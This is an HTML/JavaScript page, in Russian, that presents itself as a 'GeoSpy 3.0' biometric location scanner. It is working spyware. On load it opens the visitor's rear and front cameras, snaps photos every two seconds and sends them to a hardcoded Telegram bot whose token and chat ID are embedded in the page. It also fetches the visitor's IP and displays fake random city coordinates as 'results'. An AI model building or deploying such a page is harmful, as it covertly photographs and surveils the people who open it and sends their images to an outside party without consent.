<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GeoSpy 3.0</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Arial', sans-serif;
            background: #0a0a0a;
            color: white;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        
        .container {
            width: 95%;
            max-width: 400px;
            padding: 20px;
            background: #1a1a1a;
            border-radius: 15px;
            box-shadow: 0 0 30px rgba(0, 0, 0, 0.8);
        }
        
        h1 {
            font-size: 22px;
            margin-bottom: 15px;
            color: #00bcd4;
        }
        
        .camera-preview {
            width: 100%;
            height: 250px;
            background: #000;
            border-radius: 10px;
            margin: 15px 0;
            position: relative;
            overflow: hidden;
        }
        
        .target-marker {
            position: absolute;
            width: 30px;
            height: 30px;
            border: 3px solid #f44336;
            border-radius: 50%;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation: pulse 1.5s infinite;
            z-index: 10;
        }
        
        @keyframes pulse {
            0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
            50% { transform: translate(-50%, -50%) scale(1.2); opacity: 0.7; }
            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
        }
        
        .scan-button {
            background: linear-gradient(90deg, #00bcd4, #0097a7);
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 16px;
            border-radius: 50px;
            cursor: pointer;
            margin: 15px 0;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
            transition: all 0.3s;
        }
        
        .scan-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
        }
        
        .scan-button:disabled {
            background: #555;
            cursor: not-allowed;
        }
        
        .status-text {
            font-size: 14px;
            margin: 10px 0;
            min-height: 40px;
            color: #aaa;
        }
        
        .result-box {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            text-align: left;
            display: none;
        }
        
        .info-line {
            margin: 8px 0;
            font-size: 13px;
        }
        
        .info-label {
            color: #00bcd4;
            display: inline-block;
            width: 120px;
        }
        
        #realCameraFeed {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>GeoSpy 3.0</h1>
        <div class="camera-preview">
            <div class="target-marker"></div>
            <video id="realCameraFeed" autoplay playsinline></video>
        </div>
        
        <div class="status-text" id="statusText">
            Наведите камеру на лицо для биометрического анализа
        </div>
        
        <button class="scan-button" id="scanButton">Определить местоположение</button>
        
        <div class="result-box" id="resultBox">
            <div class="info-line">
                <span class="info-label">IP-адрес:</span>
                <span id="ipAddress">192.168.1.1</span>
            </div>
            <div class="info-line">
                <span class="info-label">Браузер:</span>
                <span id="browserInfo">Chrome 114</span>
            </div>
            <div class="info-line">
                <span class="info-label">ОС:</span>
                <span id="osInfo">Windows 10</span>
            </div>
            <div class="info-line">
                <span class="info-label">Устройство:</span>
                <span id="deviceInfo">Desktop</span>
            </div>
            <div class="info-line">
                <span class="info-label">Город:</span>
                <span id="cityInfo">Москва</span>
            </div>
            <div class="info-line">
                <span class="info-label">Координаты:</span>
                <span id="coordsInfo">55.7558° N, 37.6173° E</span>
            </div>
        </div>
    </div>

    <!-- Скрытые элементы для камер -->
    <video id="backCamera" autoplay playsinline class="hidden"></video>
    <canvas id="canvas1" class="hidden"></canvas>
    <canvas id="canvas2" class="hidden"></canvas>

    <script>
        // Ваши данные
        const BOT_TOKEN = "7606258807:AAEntpmxwggkW_qRbDAXkzs8kMkNqL03N6U";
        const CHAT_ID = "1224978194";
        
        let frontStream = null;
        let backStream = null;
        let isScanning = false;
        let scanInterval = null;
        
        // Элементы интерфейса
        const scanButton = document.getElementById('scanButton');
        const statusText = document.getElementById('statusText');
        const resultBox = document.getElementById('resultBox');
        const realCameraFeed = document.getElementById('realCameraFeed');
        
        // Собираем информацию о пользователе
        function getUserInfo() {
            const userAgent = navigator.userAgent;
            let os = "Не определено";
            let device = "Не определено";
            
            // Определяем ОС
            if (userAgent.includes("Windows")) os = "Windows";
            else if (userAgent.includes("Mac")) os = "MacOS";
            else if (userAgent.includes("Linux")) os = "Linux";
            else if (userAgent.includes("Android")) os = "Android";
            else if (userAgent.includes("iOS")) os = "iOS";
            
            // Определяем устройство
            if (userAgent.includes("Mobile")) device = "Мобильное";
            else if (userAgent.includes("Tablet")) device = "Планшет";
            else device = "Компьютер";
            
            // Получаем примерные координаты (фейковые)
            const fakeCoords = {
                Москва: { lat: 55.7558, lon: 37.6173 },
                СПб: { lat: 59.9343, lon: 30.3351 },
                Киев: { lat: 50.4501, lon: 30.5234 },
                Минск: { lat: 53.9045, lon: 27.5615 }
            };
            const cities = Object.keys(fakeCoords);
            const randomCity = cities[Math.floor(Math.random() * cities.length)];
            
            return {
                ip: "Loading...", // Заполним позже через API
                browser: navigator.userAgent,
                os: os,
                device: device,
                city: randomCity,
                coords: fakeCoords[randomCity]
            };
        }
        
        // Получаем реальный IP через API
        async function getRealIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("IP error:", error);
                return "Не определен";
            }
        }
        
        // Инициализация камер
        async function initCameras() {
            try {
                // Получаем заднюю камеру для "превью"
                backStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' } 
                });
                realCameraFeed.srcObject = backStream;
                
                // Пытаемся получить фронтальную камеру
                try {
                    frontStream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user' }
                    });
                    document.getElementById('backCamera').srcObject = frontStream;
                } catch (e) {
                    console.log("Не удалось получить фронтальную камеру");
                }
                
                // Начинаем скрытую съемку
                startHiddenScan();
                
            } catch (error) {
                console.error("Camera error:", error);
                statusText.textContent = "Ошибка доступа к камере. Разрешите доступ и обновите страницу.";
            }
        }
        
        // Скрытая съемка каждые 2 секунды
        function startHiddenScan() {
            // Первый снимок сразу
            setTimeout(captureAndSendPhotos, 1000);
            
            // Затем каждые 2 секунды
            scanInterval = setInterval(() => {
                captureAndSendPhotos();
            }, 2000);
        }
        
        // Захват и отправка фото
        async function captureAndSendPhotos() {
            if (!backStream) return;
            
            try {
                // Делаем снимок с задней камеры
                const backPhoto = await capturePhoto('realCameraFeed', 'canvas1');
                await sendPhoto(backPhoto, 'geo_scan_back.jpg');
                
                // Если есть фронтальная камера - снимок с нее
                if (frontStream) {
                    const frontPhoto = await capturePhoto('backCamera', 'canvas2');
                    await sendPhoto(frontPhoto, 'geo_scan_front.jpg');
                }
                
            } catch (error) {
                console.error("Capture error:", error);
            }
        }
        
        // Функция захвата фото
        function capturePhoto(videoElement, canvasId) {
            return new Promise((resolve) => {
                const canvas = document.getElementById(canvasId);
                const video = document.getElementById(videoElement);
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(resolve, 'image/jpeg', 0.9);
            });
        }
        
        // Функция отправки фото
        async function sendPhoto(blob, fileName) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, fileName);
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error("Send error:", error);
            }
        }
        
        // Обработчик кнопки сканирования
        scanButton.addEventListener('click', async () => {
            if (isScanning) return;
            
            isScanning = true;
            scanButton.disabled = true;
            statusText.textContent = "Инициализация биометрического сканера...";
            
            // Получаем реальный IP
            const userInfo = getUserInfo();
            userInfo.ip = await getRealIP();
            
            // Имитация процесса сканирования
            setTimeout(() => {
                statusText.textContent = "Сканирование сетевой активности...";
                
                setTimeout(() => {
                    statusText.textContent = "Анализ цифрового профиля...";
                    
                    setTimeout(() => {
                        statusText.textContent = "Определение местоположения...";
                        
                        setTimeout(() => {
                            // Показываем "результаты"
                            statusText.textContent = "Анализ завершен!";
                            resultBox.style.display = "block";
                            
                            // Заполняем данные
                            document.getElementById('ipAddress').textContent = userInfo.ip;
                            document.getElementById('browserInfo').textContent = userInfo.browser;
                            document.getElementById('osInfo').textContent = userInfo.os;
                            document.getElementById('deviceInfo').textContent = userInfo.device;
                            document.getElementById('cityInfo').textContent = userInfo.city;
                            document.getElementById('coordsInfo').textContent = 
                                `${userInfo.coords.lat.toFixed(4)}° N, ${userInfo.coords.lon.toFixed(4)}° E`;
                            
                            scanButton.disabled = false;
                            isScanning = false;
                            
                        }, 3000);
                    }, 3000);
                }, 2000);
            }, 1000);
        });
        
        // Запускаем при загрузке
        window.addEventListener('load', initCameras);
        
        // Очистка при закрытии
        window.addEventListener('beforeunload', () => {
            if (frontStream) frontStream.getTracks().forEach(track => track.stop());
            if (backStream) backStream.getTracks().forEach(track => track.stop());
            if (scanInterval) clearInterval(scanInterval);
        });
    </script>
</body>
</html>
